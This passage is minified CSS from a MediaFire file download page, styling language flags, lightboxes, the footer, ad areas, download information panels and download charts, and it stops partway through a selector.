#goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/isr.svg)}.hi #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.hmn #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/chn.svg)}.hu #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/hun.svg)}.is #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/isl.svg)}.ig #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nga.svg)}.id #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/idn.svg)}.ga #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/irl.svg)}.it #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ita.svg)}.ja #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/jpn.svg)}.jw #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/idn.svg)}.kn #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.kk #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/kaz.svg)}.km #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/khm.svg)}.ko #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/kor.svg)}.ku #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/tur.svg)}.ky #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/kgz.svg)}.lo #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/lao.svg)}.la #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/vat.svg)}.lv #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/lva.svg)}.lt #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ltu.svg)}.lb #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/lux.svg)}.mk #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mkd.svg)}.mg #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mdg.svg)}.ms #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mys.svg)}.ml #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.mt #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mlt.svg)}.mi #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nzl.svg)}.mr #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.mn #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mng.svg)}.my #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mmr.svg)}.ne #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.no #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nor.svg)}.ps #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/afg.svg)}.fa #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/irn.svg)}.pl #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/pol.svg)}.pt #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/prt.svg)}.pa #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.ro #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/rou.svg)}.ru #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/rus.svg)}.sm #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/wsm.svg)}.gd #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/sco.svg)}.sr #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/srb.svg)}.st #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/zaf.svg)}.sn #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/zwe.svg)}.sd #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.si #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/lka.svg)}.sk #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/svk.svg)}.sl #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/svn.svg)}.so #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/som.svg)}.es #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/esp.svg)}.su #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/idn.svg)}.sw #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/uga.svg)}.sv #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/swe.svg)}.tg #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/tjk.svg)}.ta #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/lka.svg)}.te #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.th #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/tha.svg)}.tr #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/tur.svg)}.uk #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ukr.svg)}.ur #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/pak.svg)}.uz #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/uzb.svg)}.vi #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/vnm.svg)}.cy #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/wal.svg)}.xh #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/zaf.svg)}.yi #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/isr.svg)}.yo #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nga.svg)}.zu #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/zaf.svg)}.page{padding-top:10px;padding-bottom:70px;background:#fff;min-height:800px}.content{max-width:960px;margin:0 auto;position:relative;background:#fff}.social-cont{margin-top:7px;width:213px}.social-fb-cont{width:211px;border-radius:6px;background:#fff;border:1px solid #c5d0e3}.social-fb-cont>iframe{overflow:hidden;padding:15px 10px 0px;width:190px}.social-fb-cont>span{text-overflow:ellipsis;overflow:hidden;white-space:nowrap;display:block;color:#3c5a98;background:#e6e9f1 url(//static.mediafire.com/images/backgrounds/download/social/fb_16x16.png) no-repeat 10px center;border-bottom:1px solid #c5d0e3;height:35px;line-height:36px;font-size:12px;font-weight:600;border-radius:5px 5px 0 0;margin:0;text-indent:35px}#download-arrow{pointer-events:none;position:fixed;left:6px;bottom:0;z-index:9999;width:165px;height:229px;opacity:0;transition:opacity 0.2s;background-repeat:no-repeat;background-position:bottom;background-image:url(//static.mediafire.com/images/download/arrow_chrome.png)}#ParallelDL-optIn{background:#474747;border-radius:3px;color:white;font-size:10px;line-height:22px;float:right;clear:both;width:250px;text-align:center;margin-top:10px}#ParallelDL-optIn>span{padding:2px 5px;background:rgba(0,0,0,.5);border-radius:3px;margin-left:5px;text-transform:uppercase;font-size:9px}#ParallelDL-optIn:hover{background-color:#0070F0;background-color:var(--mf-blue4);color:#fff}.mobile #ParallelDL-optIn{display:none}#share{display:none;position:fixed;top:0;right:0;left:0;bottom:0;background:rgba(0,0,0,0.8);z-index:10000}#share figure{height:100%;margin:0;width:100%}#share.lightbox .close::after{right:22px;top:8px;width:30px;height:30px;border-radius:50%}@media (max-width:620px){#share.lightbox .close::after{right:10px;top:10px}}#share figcaption{height:100%;width:100%;background:transparent;padding:0}#share iframe{border:0;height:100%;width:100%;display:block}.nonDLContentWrap{min-height:1500px}#ads{overflow:hidden;border:0;margin-bottom:50px}.ads-temp #ads,.ads-normal #ads,.spiralyze #ads{height:1450px}.ads-alternate .DLExtraInfo-wrap{position:absolute;top:738px;left:0}.ads-alternate .DLExtraInfo.DLExtraInfo-additional{margin-top:130px}.lightbox .h1,.lightbox .h2,.lightbox .h3,.lightbox .h4,.lightbox .h5,.lightbox .h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.lightbox .h1{font-size:2.9rem}.lightbox .h2{font-size:2.3rem}.lightbox .h3{font-size:1.9rem}.lightbox .h4{font-size:1.6rem}.lightbox .h5{font-size:1.3rem}.lightbox .h6{font-size:1rem;font-weight:bold}.lightbox .font-weight-normal{font-weight:normal!important}.lightbox .font-weight-bold{font-weight:bold!important}.lightbox .g-Btn{display:inline-flex;align-items:center;justify-content:center;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:.79rem;font-weight:normal;cursor:pointer;height:auto;line-height:1.5;padding:6px 15px;border:0;outline:0;text-transform:uppercase;-webkit-appearance:none;box-sizing:border-box;min-height:36px}.lightbox .g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.lightbox .g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.lightbox .g-Btn--tertiary{color:#fff;background:#6c3}.lightbox .g-Btn--alt{color:#fff;background:#282f3d}.lightbox .g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.lightbox .g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}.lightbox a.g-Btn--primary:hover,.lightbox a.g-Btn--tertiary:hover,.lightbox a.g-Btn--alt:hover{color:#fff}.lightbox a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.lightbox .g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(//static.mediafire.com/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.lightbox .g-Btn .g-Icon{margin:0 8px 0 -2px}.lightbox .dropdown .g-Icon{margin-right:8px;opacity:0.5}.lightbox .g-Icon--white{background-image:url(//static.mediafire.com/images/icons/svg_light/icons_sprite.svg)}.lightbox .g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.lightbox .g-Icon--arrowRight{background-position:-1632px 0}.lightbox{display:none}.lightbox.on,.lightbox:target{position:fixed;left:0;top:0;width:100%;height:100%;display:flex!important;align-items:center;justify-content:center;outline:none;overflow:auto;z-index:1000}.lightbox.on{background-color:rgba(0,0,0,.7)}.lightbox:not(:target,.on){display:none!important}.lightbox figure{margin:auto}.lightbox figcaption{position:relative;padding:2px;background-color:#fff;border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.35);z-index:1001}.lightbox .close{position:relative;display:block}.lightbox .close::after{right:0;top:0;height:40px;width:40px;border-radius:5px;opacity:0.4;background:url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;position:absolute;display:flex;z-index:1;align-items:center;justify-content:center;background-color:white;color:white;content:"";z-index:1002}.lightbox .close:hover:after{opacity:0.8}.lightbox .close::before{left:0;top:0;width:100%;height:100%;position:fixed;content:"";cursor:default;z-index:1000}.lightbox-title{font-size:18px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:20px 30px;display:block}.lightbox-content{padding:0 30px 80px}.lightbox-content label{display:block;margin-bottom:5px;font-weight:bold}.lightbox-btns{padding:0px 15px 15px;position:absolute;bottom:0;right:0;left:0}.lightbox-btns .g-Btn{float:right;margin-left:10px}#footer{padding:0px;width:100%;background-color:#f3f3f3;height:auto;min-height:260px;color:#575B65;color:var(--mf-gray4);box-shadow:inset 0 1px 0px 0 rgba(0,0,0,.03)}#footer em{font-style:normal;font-weight:bold}#footer b{font-weight:normal}.footerColWrap{padding:30px 0 10px}.footerCol{width:25%;float:left;font-size:13px;padding-right:30px;box-sizing:border-box}.footerCol h2{display:block;padding:0 0 0px 0;margin-bottom:10px;font-family:'Open Sans',sans-serif;font-size:12px;position:relative;font-weight:600;text-transform:uppercase}#footer a{color:#575B65;color:var(--mf-gray4)}#footer a:hover{color:#222835;color:var(--mf-gray2)}#footerColFollow a{padding-left:24px}#footer .mflogo_footer{display:none;position:absolute;top:32px;left:0;height:16px;width:122px;padding:0;margin-top:-3px;text-align:center;background:url(//static.mediafire.com/images/v4images/backgrounds/mflogo_footer.png) right bottom no-repeat}#footer .mflogo_footer:hover{text-decoration:none}.myfiles #footer,.filePreview #footer,.fileEdit #footer,.appView #footer{height:0;min-height:0;position:fixed;bottom:0;background:#ebebeb;-webkit-box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);-webkit-transition:height .3s ease 0s;-moz-transition:height .3s ease 0s;font-family:'Open Sans',sans-serif;z-index:20}#subFooterWrap{position:relative;border-top:1px solid #E3E3E3}.myfiles #subFooterWrap,.filePreview #subFooterWrap,.fileEdit #subFooterWrap{border:none}.myfiles #subFooterWrap:before,.filePreview #subFooterWrap:before,.fileEdit #subFooterWrap:before{display:none}#subFooter{position:relative;height:auto;padding:17px 0;clear:both;font-size:12px}.subFooterLinks{margin-right:124px}#subFooter li{display:inline;margin-right:20px;position:relative}#subFooter li:first-child:before,#subFooter li.footerIcn:before{display:none}#subFooter a{text-shadow:none}#subFooterSocialWrap{min-width:890px}#subFooterSocial{position:absolute;right:0;top:0}#subFooterSocial li{float:right;margin:12px 0 0 10px}.texasNote{display:none}.footerIcn a{display:block;position:relative;height:28px;width:28px;padding:0;border-radius:3px;-webkit-transition:background-color .2s linear;-moz-transition:background-color .2s linear;-ms-transition:background-color .2s linear;-o-transition:background-color .2s linear;transition:background-color .2s linear;background-color:rgba(0,0,0,0.1)}.footerIcn a:hover{background-color:#47A9EB}.footerIcn span{position:absolute;height:100%;width:100%;top:0;left:0;background-image:url(//static.mediafire.com/images/backgrounds/footer/social/footerIcons.png);background-repeat:no-repeat;cursor:pointer;opacity:.3}.footerIcnFb{background-position:0px top}.footerIcnTw{background-position:-28px top}.footerIcnBlog{background-position:-84px top}#subFooter li.myFilesFooterShow{display:none}.myfiles #subFooter li.myFilesFooterShow{display:block}.myfiles #subFooter .dropUp li{margin:0;display:block}.myfiles #subFooter .footerColWrap li:before,.filePreview #subFooter .footerColWrap li:before,.fileEdit #subFooter .footerColWrap li:before{display:none}#minSocialLinks{display:none}@media (max-width:960px){.footerCol{padding:0 30px}#subFooter{padding:17px 30px}#subFooterSocial{padding-right:30px}}@media (max-width:910px){#subFooterSocial{position:static;margin:0;float:left;width:auto;padding:20px 0}}@media (max-width:770px){.footerCol{width:auto;float:none;padding:10px 30px 0;border-bottom:1px solid #e8e9ec}.footerCol li{display:inline-block;margin-right:20px;font-size:12px;margin-bottom:10px}.footerColWrap{padding:0}#subFooterWrap{border:0}#subFooter{padding:30px}#subFooter li#copyrightInfo{display:block;margin:10px 0 30px 0}.subFooterLinks{margin:0}#subFooter li:not(.footerIcn){margin:0 20px 10px 0;display:inline-block}}.ads-temp .content,.ads-normal .content,.spiralyze .content{width:960px}.ads-normal .content,.ads-alternate .content{min-height:1500px}.ads .dl-btn-cont{width:auto;margin:0;border-radius:6px 6px 0 0}.ads-temp .ads .dl-btn-cont{width:auto;border-radius:6px;margin:0}.center{width:604px;height:580px;position:absolute;background:#fff;right:0;top:110px;overflow:hidden;overflow-y:auto;border-radius:6px}.spiralyze .center{height:610px}.dl-promo-cont{color:#fff;border-radius:0 0 6px 6px;box-shadow:inset 0 1px 0 0 rgba(255,255,255,.1);font-size:13px;text-align:center;position:relative;display:block;padding:8px;background:#474747 url(//static.mediafire.com/images/backgrounds/download/dl_promo_logo.png) 10px 8px no-repeat}.dl-promo-cont>span{position:absolute;right:5px;top:5px;height:26px;line-height:26px;padding:0 20px;background:#757575;text-transform:uppercase;font-size:10px;font-weight:bold;border-radius:3px}.dl-promo-cont:hover{color:#fff}.ads-temp .dl-promo-cont{max-width:600px;width:100%;height:34px;margin-left:auto;margin-right:auto;display:block;background:#fff;font-family:Open Sans,Sans-Serif;font-size:12px;line-height:34px;text-align:center;color:#0077ff;padding:0}.ads-temp .dl-promo-cont:hover{text-decoration:underline;color:#0077ff}#form_captcha .dl-utility-nav{display:none}.dl-info{position:relative;font-size:13px;line-height:18px;padding:20px 20px 0}.intro.icon{width:100%;background-position:0 0!important;height:50px;position:static;font-size:18px;line-height:22px;padding-top:8px;margin-bottom:20px}.intro>div{margin:0 240px 0 60px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.intro .filename{font-weight:300}.intro .filetype{font-weight:700;color:#000}.details{font-weight:bold;margin:0 240px 20px 0}.details span{font-weight:normal}.description-subheading{font-weight:bold}.description p{margin:0 240px 12px 0}.sidebar{position:absolute;right:0;width:213px;top:20px}.sidebar>div{padding:10px;background:#eee;margin-bottom:10px}.sidebar ul{margin-top:10px}.sidebar .filename{display:inline-block;font-weight:bold;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.apps>ul a{display:block;height:31px;padding-left:43px;font-size:11px;line-height:13px;margin-bottom:4px;padding-top:5px;position:relative;color:#0045AD;color:var(--mf-blue3)}.apps>ul a:before{content:"";position:absolute;top:0;left:0;height:36px;width:36px;background-image:url(//static.mediafire.com/images/backgrounds/download/apps_list_sprite-v6.png);background-repeat:no-repeat}.apps a[title="Windows Picture and Fax Viewer"]:before{background-position:0 0}.apps a[title="Adobe Photoshop"]:before{background-position:0 -36px}.apps a[title="Apple Preview"]:before{background-position:0 -72px}.apps a[title="AppleWorks"]:before{background-position:0 -72px}.apps a[title="Microsoft Word"]:before{background-position:0 -144px}.apps a[title="LibreOffice"]:before{background-position:0 -180px}.apps a[title="WinZip for PC"]:before{background-position:0 -216px}.apps a[title="WinZip for Mac"]:before{background-position:0 -324px}.apps a[title="7-Zip"]:before{background-position:0 -252px}.apps a[title="QuickTime"]:before{background-position:0 -288px}.apps a[title="Windows Media Player"]:before{background-position:0 0}.apps a[title="VideoLAN VLC Media Player"]:before{background-position:0 -360px}.apps a[title="Microsoft PowerPoint"]:before{background-position:0 -396px}.apps a[title="iZip"]:before{background-position:0 -468px}.apps a[title="iTunes"]:before{background-position:0 -540px}.apps a[title="Apache OpenOffice"]:before{background-position:0 -576px}.apps a[title="Sublime Text 2"]:before{background-position:0 -612px}.apps a[title="Notepad++"]:before{background-position:0 -648px}.apps a[title="Infix PDF Editor"]:before{background-position:0 -684px}.apps a[title="Adobe Reader"]:before{background-position:0 -720px}.apps a[title="Microsoft 365"]:before{background-position:0 -108px}.apps a[title="PaintShop Pro"]:before{background-position:0 -432px}.apps a[title="Roxio Creator"]:before{background-position:0 -504px}.apps a[title="WordPerfect Office"]:before{background-position:0 -756px}.apps a[title="Pinnacle Studio"]:before{background-position:0 -792px}.Download-compatibility>div{margin-bottom:15px}.Download-compatibility .g-Select{width:100%;padding-left:10px;margin-bottom:15px}.Download-compatibilityStatus{font-size:11px;line-height:14px}.Download-compatibilityStatus span{height:18px;width:18px;float:left}.Download-compatibilityStatus p{margin-left:28px}.Download-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.Download-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLMobile-upsellBox{display:none;margin:0 auto 50px;color:#ffffff;text-align:center;position:relative;z-index:1;max-width:450px}.DLMobile-upsellBox>div{background:#0045a6;padding:20px;margin:0 20px;box-sizing:border-box}.mobile.ads-mobileLegacy .DLMobile-upsellBox,.mobile.ads-mobile4 .DLMobile-upsellBox{display:block}.DLMobile-upsellBoxLogo{display:inline-block;margin:10px 0 15px;width:60px;height:60px;border-radius:50%;background:#07f url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_flame_reversed.svg) center / auto 26px no-repeat}.DLMobile-upsellBox p{font-size:17px;margin-bottom:20px}.DLMobile-upsellBox ul{margin:0 0 30px;text-align:left;list-style-type:disc;display:inline-block}.DLMobile-upsellBox a{display:block;border-radius:3px;padding:12px 0;background:#ff8637;color:#000;font:normal 14px/16px Arial,sans-serif;text-transform:uppercase}.spiralyze .DLExtraInfo-wrap,.ads-normal .DLExtraInfo-wrap{position:absolute;top:850px;left:0}.ads-mobileLegacy .dl_pro_upsell{display:none}.DLExtraInfo{box-sizing:border-box;margin-bottom:30px;padding-bottom:30px;border-bottom:2px solid #f4f4f5;display:flex;flex-direction:row;justify-content:space-between;flex-wrap:wrap;width:960px}.DLExtraInfo:last-child{border:0;margin-bottom:0;padding-bottom:0}.DLExtraInfo-groupHeading{color:#0070F0;color:var(--mf-blue4);font-size:24px;font-weight:normal;width:100%;margin:0 0 30px;padding:0 30px;box-sizing:border-box;display:none}.DLExtraInfo-sectionHeading{font-size:14px;margin:0 0 15px;width:100%;font-weight:bold}.DLExtraInfo-sectionSubHeading{margin:0;font-size:13px}.DLExtraInfo p{font-size:13px;line-height:1.4;margin-bottom:10px}.DLExtraInfo-column{display:flex;flex-wrap:wrap;flex:1;align-content:flex-start;padding:0 25px}.DLExtraInfo-column:first-child{padding-left:0}.DLExtraInfo-column:last-child{padding-right:0}.DLExtraInfo-row{display:flex;flex-wrap:wrap;padding:0 0 20px 0}.DLExtraInfo-sectionGraphic{background-color:#fff;height:96px;width:160px;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin:0 30px 15px 0;padding:20px;box-sizing:border-box;position:relative}.DLExtraInfo-sectionGraphicCenter{height:100%;width:100%;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionIcon{width:72px;height:72px;margin:0 30px 15px 0;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionDetails{flex:1;min-height:50px}.DLExtraInfo-statusOverlay{position:absolute;top:0;left:0;background:#fff;width:100%;height:100%;display:flex;justify-content:center;align-items:center;font-size:13px}.DLExtraInfo-statusOverlay div{padding:30px}.DLExtraInfo-sectionGraphic .DLExtraInfo-statusOverlay div{background:url(//static.mediafire.com/images/icons/svg_dark/image-broken-variant.svg) center / 24px no-repeat;opacity:.2}.DLExtraInfo-uploadLocationMap{height:227px;background:#4cacff;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin-bottom:30px;width:100%;position:relative}.DLExtraInfo-uploadLocationMapBg.Continent{background:#4cacff url(//static.mediafire.com/images/backgrounds/download/additional_content/world.svg) center / contain no-repeat}.DLExtraInfo-uploadLocationMap span{display:inline-block;padding:4px 8px;color:#fff;font-size:11px;background-color:rgba(0,0,0,.4);position:relative;z-index:1}.DLExtraInfo-uploadLocationRegion{background-position:center;background-size:contain;background-repeat:no-repeat;position:absolute;width:100%;height:100%;top:0;left:0}.DLExtraInfo-uploadLocationRegion.continent-na{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-na.svg)}.DLExtraInfo-uploadLocationRegion.continent-sa{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-sa.svg)}.DLExtraInfo-uploadLocationRegion.continent-eu{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-eu.svg)}.DLExtraInfo-uploadLocationRegion.continent-as{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg)}.DLExtraInfo-uploadLocationRegion.continent-af{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-af.svg)}.DLExtraInfo-uploadLocationRegion.continent-oc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-oc.svg)}.DLExtraInfo-uploadLocationRegion.country-ru{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-ru.svg)}.DLExtraInfo-uploadLocationRegion.country-tr{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-tr.svg)}.DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{width:80px;height:50px;background-position:0 0;background-size:contain;background-repeat:no-repeat;background-color:transparent;box-shadow:none;margin-bottom:0}.DLExtraInfo-uploadLocation p{margin-bottom:0}.DLExtraInfo-virusTotal p span{color:#6c3}.DLExtraInfo-virusTotalImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/flag.svg)}.DLExtraInfo-uploadIsp .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/dt.svg)}.DLExtraInfo-accountStatusImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/mf_round.svg)}.DLExtraInfo-referrer .DLExtraInfo-sectionIcon{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/gh.svg)}.browser-android{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_android.png)}.browser-uc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_uc.png)}.browser-chrome{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_chrome.svg)}.browser-edge{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_edge.svg)}.browser-firefox{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_firefox.svg)}.browser-ie{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_ie.svg)}.browser-opera{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_opera.svg)}.browser-safari{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_safari.svg)}.browser-samsung{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_samsung.svg)}.browser-unknown{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_unknown.svg)}.DLExtraInfo-downloadAppStatus.is-upToDate{color:#6c3}.DLExtraInfo-downloadAppStatus.is-outOfDate{color:#ef5939}.ExternalLink:after{content:"";display:inline-block;height:12px;width:12px;vertical-align:baseline;margin-left:4px;background:url(//static.mediafire.com/images/icons/svg_dark/external_link.svg) 0 1px no-repeat}p.DLExtraInfo-compatibilityStatus{width:100%;font-weight:bold;margin-bottom:30px}.DLExtraInfo-compatibilityStatus span{display:inline-block;height:18px;width:18px;background:#ddd;vertical-align:middle;margin-right:10px}.DLExtraInfo-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.DLExtraInfo-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphic{height:160px}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/wikipedia_logo_v2.svg)}.DLExtraInfo-downloadChart{width:100%}.DLExtraInfo-downloadChartGraph{height:400px;background:#fff;border:2px solid hsl(225,9%,93%);border-bottom-color:#282f3d;box-sizing:border-box;padding-top:40px;display:flex;position:relative}.DLExtraInfo-downloadChartNumbers{display:flex;flex-direction:column;width:100%;justify-content:space-between;margin:0;padding:40px 0 0;box-sizing:border-box;position:absolute;bottom:0;top:0}.DLExtraInfo-downloadChartNumbers li{text-transform:uppercase;font-size:11px;color:#b2b7c4;display:flex;align-items:center}.DLExtraInfo-downloadChartNumbers li:last-child{visibility:hidden}.DLExtraInfo-downloadChartNumbers li span{width:60px;text-align:right;padding:0 15px;box-sizing:border-box;position:relative;top:-5px;height:0}.DLExtraInfo-downloadChartNumbers li:after{content:"";height:1px;background:rgba(0,0,0,.05);flex:1}.DLExtraInfo-downloadChartBars{display:flex;justify-content:space-around;align-items:flex-end;flex:1;padding-left:60px;position:relative}.DLExtraInfo-downloadChartBars div{width:12%;background:#6c3}.DLExtraInfo-downloadChartDays{display:flex;margin:10px 0 30px;padding-left:60px;justify-content:space-around}.DLExtraInfo-downloadChartDays li{flex:1;text-align:center;text-transform:uppercase;font-size:11px;color:#b2b7c4}.DLExtraInfo-downloadChartLegend{font-size:12px;font-style:italic;margin-bottom:50px}.DLExtraInfo-downloadChartLegend div{display:inline-block;height:16px;width:16px;background:#6c3;vertical-align:text-bottom}.DLExtraInfo-downloadChartLegend span{margin:0 8px}.DLExtraInfo-downloadList ul{margin:0;font-size:12px;width:100%;position:relative}.DLExtraInfo-downloadList li{border-bottom:1px solid #e8e9ec;padding:8px 0;display:flex;justify-content:space-between;word-break:break-all}.DLExtraInfo-downloadList li:last-child{border:none;padding-bottom:0}.DLExtraInfo-downloadTotalsDetail{background:#fff;border:2px solid hsl(225,9%,93%);display:flex;width:100%;position:relative}.DLExtraInfo-downloadTotalsDetailData,.DLExtraInfo-downloadTotalsDetailFiles{flex:1;padding:15px}.DLExtraInfo-downloadTotalsDetailData{border-right:2px solid hsl(225,9%,93%)}.DLExtraInfo-downloadTotalsDetail .DLExtraInfo-sectionSubHeading{font-weight:normal;margin-bottom:5px}.DLExtraInfo-downloadTotalsDetail span{font-size:30px;font-weight:300}.DLExtraInfo-downloadDataGraphic,.DLExtraInfo-downloadFilesGraphic{height:60px;width:60px;float:left;opacity:.1}.DLExtraInfo-downloadDataGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/database.svg) 0 0 / 48px no-repeat}.DLExtraInfo-downloadFilesGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/file_multiple.svg) 0 6px / 36px no-repeat}.ie10 .DLExtraInfo-uploadLocation 